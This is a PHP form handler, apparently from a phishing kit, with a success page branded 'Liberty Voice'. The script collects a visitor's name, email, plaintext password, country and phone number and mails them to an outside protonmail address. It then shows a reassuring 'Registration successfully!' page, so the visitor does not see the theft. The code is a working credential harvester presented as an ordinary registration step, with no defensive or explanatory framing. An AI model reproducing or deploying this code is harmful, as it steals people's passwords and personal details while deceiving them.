<?php

$recepient = "alexmon67@protonmail.com";
$sitename = "LibertyVoice_registration";


$name = trim($_POST["name"]);
$surname = trim($_POST["surname"]);
$email = trim($_POST["email"]);
$password = trim($_POST["password"]);
$Country = trim($_POST["Country"]);
$tel = trim($_POST["tel"]);



$message = "Name: $name \nSurname: $surname \nEmail: $email \nPassword: $password \nCountry: $Country \nPhone: $tel";

$pagetitle = "Registration \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");

?>

<html>
<head><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><title>Registration successfully!</title></head>
<body>
<br><br>

<div style="">
                    <center><img style="max-width: 100%; max-height: 100%; " src="img/Liberty%20voice%20logo_400.png" alt="laptop"></center>
</div>

<br><br>
<center><h1 style="font-size: 2.4rem;">Registration <br><br> successfully!<br><br></h1></center><br><br>
<!--a style="display: inline-block;height: 53px;height: 5.3rem;margin: 0px 0 0px;padding: 0 24px; font-size: 1.8rem; letter-spacing: 0.02em; line-height: 53px; line-height: 5.3rem; text-align: center; text-decoration: none; color: black; transition: background-color 0.2s ease-out 0s; border-radius: 7px; text-shadow: 1px 1px 0px rgba(255, 255, 255, 0.5); -webkit-box-shadow: inset 0px -3px 0px 0px rgba(50, 50, 50, 0.2); -moz-box-shadow: inset 0px -3px 0px 0px rgba(50, 50, 50, 0.2); box-shadow: inset 0px -3px 0px 0px rgba(50, 50, 50, 0.2); background: rgb(196, 255, 161); width:500px;margin:0 auto;display:block; border: 1px solid #ccc;" href="./" class='hover'>
Вернуться на сайт</a-->
<style>
</style>
</body>
</html>